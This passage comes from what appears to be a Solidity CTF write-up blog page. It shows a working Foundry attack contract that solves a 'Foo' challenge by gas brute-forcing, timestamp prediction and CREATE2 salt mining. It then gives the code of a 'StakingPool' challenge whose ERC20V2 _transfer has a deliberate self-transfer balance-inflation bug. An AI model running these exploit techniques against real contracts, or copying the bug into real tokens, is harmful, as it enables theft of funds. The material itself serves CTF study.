<h4 id="Attack-4"><a href="#Attack-4" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#123;Test&#125; from &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &#123;Foo&#125; from &quot;../src/Foo.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract FooTest is Test &#123;</span><br><span class="line">    Foo public foo;</span><br><span class="line">    FooAttack public solver;</span><br><span class="line"></span><br><span class="line">    function setUp() external &#123;</span><br><span class="line">        foo = new Foo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_hackFoo() public &#123;</span><br><span class="line">        Deployer deploy = new Deployer();</span><br><span class="line">        solver = FooAttack(deploy.deploy());</span><br><span class="line">        solver.suands1(foo);</span><br><span class="line">        solver.s2();</span><br><span class="line">        solver.s3();</span><br><span class="line">        solver.s4();</span><br><span class="line">        assertTrue(foo.isSolved());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FooAttack&#123;</span><br><span class="line">    Foo public target;</span><br><span class="line">    uint[] public challenge = new uint[](8);</span><br><span class="line"></span><br><span class="line">    function suands1(Foo _foo) public &#123;</span><br><span class="line">        target = _foo;</span><br><span class="line">        target.setup();</span><br><span class="line">        target.stage1();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function s2() public &#123;</span><br><span class="line">        for (uint i = 40_000;; i+=500) &#123;</span><br><span class="line">            (bool success, ) = address(target).call&#123;gas: i&#125;(abi.encodeWithSignature(&quot;stage2()&quot;));</span><br><span class="line">            if(success)&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            if(i &gt; 50_000 &amp;&amp; !success)&#123;</span><br><span class="line">                revert(&quot;oh! failed&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function s3() public &#123;</span><br><span class="line">        challenge[0] = (block.timestamp &amp; 0xf0000000) &gt;&gt; 28;</span><br><span class="line">        challenge[1] = (block.timestamp &amp; 0xf000000) &gt;&gt; 24;</span><br><span class="line">        challenge[2] = (block.timestamp &amp; 0xf00000) &gt;&gt; 20;</span><br><span class="line">        challenge[3] = (block.timestamp &amp; 0xf0000) &gt;&gt; 16;</span><br><span class="line">        challenge[4] = (block.timestamp &amp; 0xf000) &gt;&gt; 12;</span><br><span class="line">        challenge[5] = (block.timestamp &amp; 0xf00) &gt;&gt; 8;</span><br><span class="line">        challenge[6] = (block.timestamp &amp; 0xf0) &gt;&gt; 4;</span><br><span class="line">        challenge[7] = (block.timestamp &amp; 0xf) &gt;&gt; 0;</span><br><span class="line"></span><br><span class="line">        for(uint i=0 ; i&lt;8 ; i++) &#123;</span><br><span class="line">            for(uint j=i+1 ; j&lt;8 ; j++) &#123;</span><br><span class="line">                if (challenge[i] &gt; challenge[j]) &#123;</span><br><span class="line">                    uint tmp = challenge[i];</span><br><span class="line">                    challenge[i] = challenge[j];</span><br><span class="line">                    challenge[j] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        target.stage3();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function s4() public &#123;</span><br><span class="line">        target.stage4();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check() public view returns (bytes32) &#123;</span><br><span class="line">        uint a = gasleft();</span><br><span class="line">        uint bal = address(0x100).balance;</span><br><span class="line">        uint b = gasleft();</span><br><span class="line">        uint c = a - b;</span><br><span class="line">        if (c &lt; 1000)</span><br><span class="line">        &#123;</span><br><span class="line">            return keccak256(abi.encodePacked(&quot;13337&quot;));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return keccak256(abi.encodePacked(&quot;1337&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sort(uint256[] memory) public view returns (uint256[] memory)&#123;</span><br><span class="line">        return challenge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pos() public view returns (bytes32)&#123;</span><br><span class="line">        bytes32 a = keccak256(abi.encode(4,1));</span><br><span class="line">        bytes32 b = keccak256(abi.encode(address(this),a));</span><br><span class="line">        return b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Deployer&#123;</span><br><span class="line">    address public deployedAddress;</span><br><span class="line"></span><br><span class="line">    function deploy() public returns(address)&#123;</span><br><span class="line">      </span><br><span class="line">        address addr;</span><br><span class="line">        bytes memory bytecode = type(FooAttack).creationCode;</span><br><span class="line">        uint256 salt = creatsalt();</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        deployedAddress = addr;</span><br><span class="line">        </span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function creatsalt() public view returns (uint i)&#123;</span><br><span class="line">        bytes memory bytecode = type(FooAttack).creationCode;</span><br><span class="line">        for(i=0;i&lt;99999;i++)&#123;</span><br><span class="line">            bytes32 hash = keccak256(</span><br><span class="line">                abi.encodePacked(</span><br><span class="line">                    bytes1(0xff),</span><br><span class="line">                    address(this),</span><br><span class="line">                    i,</span><br><span class="line">                    keccak256(bytecode)</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">            if(uint256(uint160(uint(hash))) % 1000 == 137)&#123;</span><br><span class="line">                return i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="六-StakingPool"><a href="#六-StakingPool" class="headerlink" title="六.StakingPool"></a>六.StakingPool</h3><h4 id="Code-5"><a href="#Code-5" class="headerlink" title="Code"></a>Code</h4><h5 id="ERC20-sol"><a href="#ERC20-sol" class="headerlink" title="ERC20.sol"></a>ERC20.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Context &#123;</span><br><span class="line">    constructor()  &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function _msgSender() internal view virtual returns (address) &#123;</span><br><span class="line">        return msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _msgData() internal view virtual returns (bytes memory) &#123;</span><br><span class="line">        this; </span><br><span class="line">        return msg.data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Interface of the ERC20 standard as defined in the EIP.</span><br><span class="line"> */</span><br><span class="line">interface IERC20 &#123;</span><br><span class="line"></span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function transfer(address recipient, uint256 amount)</span><br><span class="line">        external</span><br><span class="line">        returns (bool);</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function transferFrom(</span><br><span class="line">        address sender,</span><br><span class="line">        address recipient,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) external returns (bool);</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    event Approval(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 value</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// File: @openzeppelin/contracts/utils/ReentrancyGuard.sol</span><br><span class="line">contract Ownable is Context &#123;</span><br><span class="line">    address private _owner;</span><br><span class="line">    address private _previousOwner;</span><br><span class="line"></span><br><span class="line">    event OwnershipTransferred(</span><br><span class="line">        address indexed previousOwner,</span><br><span class="line">        address indexed newOwner</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    constructor()  &#123;</span><br><span class="line">        address msgSender = _msgSender();</span><br><span class="line">        _owner = _msgSender();</span><br><span class="line">        emit OwnershipTransferred(address(0), msgSender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function owner() public view returns (address) &#123;</span><br><span class="line">        return _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(_owner == _msgSender(), &quot;Ownable: caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function renounceOwnership() public virtual onlyOwner &#123;</span><br><span class="line">        emit OwnershipTransferred(_owner, address(0));</span><br><span class="line">        _owner = address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferOwnership(address newOwner) public virtual onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            newOwner != address(0),</span><br><span class="line">            &quot;Ownable: new owner is the zero address&quot;</span><br><span class="line">        );</span><br><span class="line">        emit OwnershipTransferred(_owner, newOwner);</span><br><span class="line">        _owner = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// File: contracts/ERC20.sol</span><br><span class="line">contract ERC20 is Ownable, IERC20 &#123;</span><br><span class="line">    mapping(address =&gt; uint256) internal _balances;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line"></span><br><span class="line">    string private _name;</span><br><span class="line">    string private _symbol;</span><br><span class="line"></span><br><span class="line">    constructor(string memory name_, string memory symbol_) &#123;</span><br><span class="line">        _name = name_;</span><br><span class="line">        _symbol = symbol_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function name() public view virtual returns (string memory) &#123;</span><br><span class="line">        return _name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function symbol() public view virtual returns (string memory) &#123;</span><br><span class="line">        return _symbol;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function decimals() public view virtual returns (uint8) &#123;</span><br><span class="line">        return 18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupply() public view virtual override returns (uint256) &#123;</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) public view virtual override returns (uint256) &#123;</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        _transfer(owner, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;IERC20-allowance&#125;.</span><br><span class="line">     */</span><br><span class="line">    function allowance(address owner, address spender) public view virtual override returns (uint256) &#123;</span><br><span class="line">        return _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        _approve(owner, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address spender = _msgSender();</span><br><span class="line">        _spendAllowance(from, spender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) &#123;</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        _approve(owner, spender, allowance(owner, spender) + addedValue);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) &#123;</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">        require(currentAllowance &gt;= subtractedValue, &quot;ERC20: decreased allowance below zero&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _approve(owner, spender, currentAllowance - subtractedValue);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address from, address to, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        require(fromBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[from] = fromBalance - amount;</span><br><span class="line">            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by</span><br><span class="line">            // decrementing then incrementing.</span><br><span class="line">            _balances[to] += amount;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit Transfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">        _afterTokenTransfer(from, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address account, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        _mint(account, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: mint to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(address(0), account, amount);</span><br><span class="line"></span><br><span class="line">        _totalSupply += amount;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.</span><br><span class="line">            _balances[account] += amount;</span><br><span class="line">        &#125;</span><br><span class="line">        emit Transfer(address(0), account, amount);</span><br><span class="line"></span><br><span class="line">        _afterTokenTransfer(address(0), account, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _burn(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: burn from the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(account, address(0), amount);</span><br><span class="line"></span><br><span class="line">        uint256 accountBalance = _balances[account];</span><br><span class="line">        require(accountBalance &gt;= amount, &quot;ERC20: burn amount exceeds balance&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[account] = accountBalance - amount;</span><br><span class="line">            // Overflow not possible: amount &lt;= accountBalance &lt;= totalSupply.</span><br><span class="line">            _totalSupply -= amount;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit Transfer(account, address(0), amount);</span><br><span class="line"></span><br><span class="line">        _afterTokenTransfer(account, address(0), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(address owner, address spender, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">        require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">        emit Approval(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual &#123;</span><br><span class="line">        uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">        if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">            require(currentAllowance &gt;= amount, &quot;ERC20: insufficient allowance&quot;);</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - amount);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ERC20V2-sol"><a href="#ERC20V2-sol" class="headerlink" title="ERC20V2.sol"></a>ERC20V2.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./ERC20.sol&quot;;</span><br><span class="line">// File: contracts/ERC20.sol</span><br><span class="line">contract ERC20V2 is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_)&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        _transfer(owner, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address spender = _msgSender();</span><br><span class="line">        _spendAllowance(from, spender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function increaseAllowance(address spender, uint256 addedValue) public virtual override returns (bool) &#123;</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        _approve(owner, spender, allowance(owner, spender) + addedValue);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual override returns (bool) &#123;</span><br><span class="line">        address owner = _msgSender();</span><br><span class="line">        uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">        require(currentAllowance &gt;= subtractedValue, &quot;ERC20: decreased allowance below zero&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _approve(owner, spender, currentAllowance - subtractedValue);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address from, address to, uint256 amount) internal override virtual &#123;</span><br><span class="line">        require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        require(fromBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);</span><br><span class="line">        uint256 toBalance = _balances[to];</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[from] = fromBalance - amount;</span><br><span class="line">            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by</span><br><span class="line">            // decrementing then incrementing.</span><br><span class="line">            _balances[to] = toBalance + amount;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit Transfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">        _afterTokenTransfer(from, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

